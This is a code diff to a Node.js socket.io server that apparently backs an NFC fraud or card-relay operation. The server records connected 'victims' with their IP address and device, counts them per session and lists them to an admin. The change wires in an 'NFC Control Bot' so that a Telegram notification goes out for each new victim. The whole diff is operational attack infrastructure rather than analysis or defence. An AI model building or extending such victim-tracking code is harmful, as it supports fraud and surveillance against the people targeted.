@@ -53,9 +53,13 @@ console.log('✅ Global variables initialized');
 // ====================================
 // ПІДКЛЮЧЕННЯ NFC БОТА
 // ====================================
+let notifyNewVictim = null;
 try {
     console.log('🤖 Loading NFC Control Bot...');
-    require('./nfc-logic.js'); 
+    const nfcModule = require('./nfc-logic.js');
+    if (nfcModule.notifyNewVictim) {
+        notifyNewVictim = nfcModule.notifyNewVictim;
+    }
     console.log('✅ NFC Control Bot loaded successfully');
 } catch (e) {
     console.error('❌ NFC Bot error:', e.message);
@@ -166,16 +170,23 @@ io.on('connection', (socket) => {
         
         const ip = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address).split(',')[0].trim();
         
-        global.activeVictims[socket.id] = {
+        const victimInfo = {
             socketId: socket.id,
             roomId: roomId,
             device: parseDevice(data.userAgent),
             ip: ip
         };
+        
+        global.activeVictims[socket.id] = victimInfo;
 
         if (global.sessions[roomId]) {
             global.sessions[roomId].totalVictims++;
             broadcastUpdate(roomId);
+            
+            // Отправляем уведомление в Telegram бот
+            if (notifyNewVictim) {
+                notifyNewVictim(roomId, victimInfo);
+            }
         }
 
         sendVictimListToAdmin(roomId);
